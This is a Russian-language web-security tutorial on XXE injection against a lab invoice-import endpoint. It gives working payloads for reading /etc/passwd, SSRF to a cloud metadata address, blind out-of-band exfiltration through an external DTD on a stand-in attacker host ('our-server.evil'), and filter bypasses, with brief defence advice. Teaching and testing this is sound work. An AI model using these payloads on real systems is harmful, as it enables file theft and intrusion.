Многие интеграции обмениваются данными в формате **XML** — текстовом формате с «тегами» вроде `<price>100</price>`. Например, бухгалтерия присылает магазину счёт в XML. У XML есть почти забытая, но опасная возможность — **сущности** (entities): короткие имена, которые подставляются в документ. Если сущность ссылается на файл, парсер его прочитает. Это и есть **XXE** — XML External Entity Injection.

В этом уроке мы возьмём импорт счетов в `shop.local` и посмотрим, как одна строка в XML читает файлы сервера.

## Наш пример: импорт счёта в XML

Магазин принимает счёт от поставщика:

```bash
$ curl -s 'https://shop.local/api/import-invoice' \
  -H 'Content-Type: application/xml' \
  --data '<invoice><number>42</number><amount>1000</amount></invoice>'
{"status":"ok","invoice":42}
```

Сервер разобрал XML и создал счёт. Теперь посмотрим, что именно умеет парсер.

## Шаг 1: что такое сущность

В XML можно объявить **сущность** — имя, которое при разборе заменяется на текст. Это как переменная:

```xml
<!DOCTYPE invoice [
  <!ENTITY company "ООО Ромашка">
]>
<invoice><seller>&company;</seller></invoice>
```

Когда парсер увидит `&company;`, он подставит «ООО Ромашка». Удобно для повторяющихся значений. Но сущность бывает **внешней** — она ссылается не на текст, а на файл или URL через `SYSTEM`:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Если парсер не отключил внешние сущности, он прочитает файл и подставит его содержимое в документ. Проверим:

```bash
$ curl -s 'https://shop.local/api/import-invoice' \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?>
<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<invoice><number>42</number><seller>&xxe;</seller></invoice>'
{"status":"error","message":"invalid seller: root:x:0:0:root:/root:/bin/bash ..."}
```

Даже в сообщении об ошибке видно содержимое `/etc/passwd`. Сущность сработала: сервер прочитал локальный файл и попытался вставить его в поле «продавец». Мы получили чтение произвольных файлов — как LFI, но через XML.

## Шаг 2: SSRF через ту же сущность

Сущность может ссылаться не только на файл, но и на URL:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

Тогда парсер сам сходит по адресу — это уже знакомый нам SSRF, но запущенный через XML-парсер. Часто там, где обычная SSRF-ручка закрыта, XML-импорт остаётся открытым.

## Шаг 3: когда вывода не видно (blind XXE)

Часто приложение не показывает содержимое в ответе — оно просто «съедает» сущность. Тогда данные нужно **вынести наружу**. Для этого объявляют сущность, которая подгружает **внешний DTD** — файл с определениями сущностей, лежащий на нашем сервере:

```xml
<!DOCTYPE invoice [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://our-server.evil/evil.dtd">
  %dtd;
]>
```

На нашем сервере `evil.dtd` формирует запрос с содержимым файла:

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://our-server.evil/?%file;'>">
%all;
```

Парсер читает `/etc/passwd`, подставляет его в URL и обращается к нам. Мы видим данные в своём логе. Это **blind XXE** (слепая — потому что ответа в приложении нет, но утечка идёт out-of-band). Здесь важны `%` — это **параметрические сущности**, они используются только внутри DTD; подробнее в `web-xxe-advanced`.

## Шаг 4: XXE прячется в «безобидных» файлах

XML — это не только `.xml`. Внутри многих привычных форматов тоже XML:

- **SVG** (картинки-векторы) — если сайт принимает аватар в SVG, в него можно вложить DOCTYPE.
- **DOCX/XLSX** — это zip-архивы с XML внутри; правим `document.xml` и загружаем как обычный документ.
- **SAML** (корпоративный вход) — XML с утверждениями; XXE там особенно опасен.
- **RSS/Atom/SOAP** — тоже XML.

Приём тот же: где есть XML-парсер, там пробуем внешнюю сущность.

## Шаг 5: обход фильтров

Разработчики пытаются вырезать `<!DOCTYPE` или `SYSTEM`. Обходы:

```bash
# сменить Content-Type — иногда JSON-эндпоинт ест и XML
-H 'Content-Type: application/xml'
# если DOCTYPE запрещён, но включён XInclude — инъекция в сам документ
<invoice xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></invoice>
# фильтр по 'SYSTEM' — используем PUBLIC или кодировку UTF-16
# фильтр по 'file://' — php://filter/convert.base64-encode/resource=/etc/passwd
```

`XInclude` — это отдельная директива включения, она работает даже когда DOCTYPE запрещён. А кодирование UTF-16 часто проскакивает фильтры, которые ищут ASCII-строки.

## Шаг 6: как понять, что парсер уязвим

По тексту ошибок:

```
DOCTYPE is disallowed              → внешние сущности запрещены, пробуй XInclude
failed to load external entity     → сущности РАБОТАЮТ, просто путь/права не те
connection refused                 → SSRF через сущность работает
Access is denied                   → файл существует, но нет прав на чтение
```

Сообщение `failed to load external entity "file:///etc/passwd"` — хороший знак: парсер пытался прочитать файл, значит, внешние сущности включены.

## Шаг 7: как отличить XXE от других уязвимостей

Начинающие путают XXE с SSRF и с LFI, потому что эффект похож. Разница в **механизме**: XXE всегда идёт через XML-парсер и его сущности. Если приложение принимает JSON, но также умеет XML (или принимает файл, внутри которого XML), XXE возможен; если XML нигде не разбирается — нет. Признаки, что парсер включён и опасен:

- в ответе есть эхо нашего значения (значит, документ разобран);
- ошибки парсера упоминают entity, DOCTYPE или external;
- сервер «ходит» по URL из документа (SSRF через сущность).

Практический подход: найди **любой** ввод, куда можно положить XML (тело запроса, загрузка файла, SOAP-вызов), и попробуй объявить внешнюю сущность. Даже если ответ пустой, попытка чтения `file:///etc/passwd` с последующим OOB часто подтверждает уязвимость.

## Шаг 8: защита и почему её обходят

Правильная защита — **полностью отключить** обработку внешних сущностей и DOCTYPE в парсере (например, `disallow-doctype-decl` в libxml, `FEATURE_SECURE_PROCESSING` в Java). Проблема в том, что это легко забыть: фреймворки и старые библиотеки часто оставляют сущности включёнными по умолчанию. Отсюда и живучесть XXE: он прячется в сторонних парсерах, в загрузке документов, в SAML-библиотеках. Поэтому при тестировании проверяй не только «явные» XML-эндпоинты, но и все места, где XML может оказаться неявно.

## Что мы теперь знаем

- XML-сущности могут ссылаться на файлы и URL (**внешние сущности**).
- **XXE** = парсер обрабатывает недоверенный XML и читает локальные файлы / делает SSRF.
- In-band — видим данные в ответе; blind — выносим через внешний DTD (OOB).
- XXE прячется в SVG, DOCX, SAML, SOAP, RSS.
- Обходы: XInclude, `PUBLIC`, кодировка UTF-16, `php://filter`.

## На что смотреть дальше

- **Все XML-эндпоинты:** импорты, SOAP-сервисы, SAML, RSS-подписки.
- **Загрузки:** SVG-аватар, DOCX/XLSX-документ — потенциальные носители.
- **Признаки уязвимости:** ошибки парсера с текстом про entity/DOCTYPE.
- **Blind-вариант:** если ответа нет, сразу готовь внешний DTD и слушай свой сервер.

## Куда дальше

Мы увидели базовый XXE: чтение файла и SSRF. Но часто ответа в приложении нет — нужна слепая эксфильтрация, параметрические сущности и трюки вроде error-based. В следующем уроке разберём **продвинутый XXE** и вынесем данные, когда вообще ничего не видно. А пока запомни: **отключи внешние сущности в парсере — иначе недоверенный XML прочитает твой диск.**

## Где пригодится

- **CTF (Web):** XXE — прямой путь к чтению флага/конфигов и SSRF; часто в задачах на XML-импорт/SOAP.
- **Bug bounty:** XXE в SAML/API — critical; blind XXE тоже высоко ценится.
- **Пентест:** проверка всех XML-эндпоинтов и загрузок SVG/DOCX входит в чеклист.
- **Работа (AppSec):** отключение внешних сущностей (`disallow-doctype-decl`, `XMLConstants.FEATURE_SECURE_PROCESSING`) — базовая мера защиты.
